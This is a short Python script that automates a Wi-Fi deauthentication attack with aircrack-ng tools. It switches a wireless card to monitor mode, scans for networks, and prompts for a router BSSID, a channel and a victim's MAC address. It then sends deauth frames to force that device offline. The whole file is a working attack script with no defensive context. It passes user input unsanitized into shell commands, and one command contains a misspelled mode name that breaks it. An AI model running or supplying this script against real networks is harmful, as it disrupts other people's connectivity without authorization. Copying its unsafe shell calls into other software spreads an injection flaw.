import subprocess
import time

def deau_attack():
	def monitore_mode():
		subprocess.call("iwconfig" , shell = True)
		time.sleep(3)
		subprocess.call("ifconfig wlan0 down" , shell = True)
		time.sleep(3)
		subprocess.call("airmon-ng check kill" , shell = True)
		time.sleep(3)
		subprocess.call("iwconfig wlan0 mode monitore" , shell = True)
		time.sleep(3)
		subprocess.call("ifconfig wlan0 up" , shell = True)
		time.sleep(3)
		subprocess.call("iwconfig" , shell = True)
	def attack():
		subprocess.call("airodump-ng wlan0 ", shell = True ,  timeout=7)
		bssid_router = input("bssid pls : ")
		channel = input("channel pls : ")
		time.sleep(3)
		subprocess.call(f"airodump-ng --bssid {bssid_router.lower()} --channel {channel} wlan0" , shell = True , timeout=10)
		time.sleep(3)
		target_device = input("your target_device mac pls : ")
		time.sleep(3)
		subprocess.call(f"aireplay-ng --deauth 100 -a{bssid_router.lower()} -c{target_device.lower()} wlan0" , shell = True)
	monitore_mode()
	time.sleep(5)
	attack()
if __name__ == "__main__" :
	deau_attack()


